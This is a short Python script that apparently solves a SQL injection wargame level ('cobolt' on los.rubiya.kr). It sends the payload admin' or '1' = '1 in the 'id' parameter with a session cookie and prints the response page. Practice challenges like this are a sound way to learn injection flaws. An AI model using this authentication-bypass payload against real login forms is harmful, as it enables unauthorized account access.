import requests
from settings import session_id
from bs4_utils import print_html

url = "https://los.rubiya.kr/chall/cobolt_b876ab5595253427d3bc34f1cd8f30db.php"
cookies = {'PHPSESSID': session_id}

params = {
    'id': "admin' or '1' = '1"
}
response = requests.get(url, params=params, cookies=cookies)
print_html(response.text)
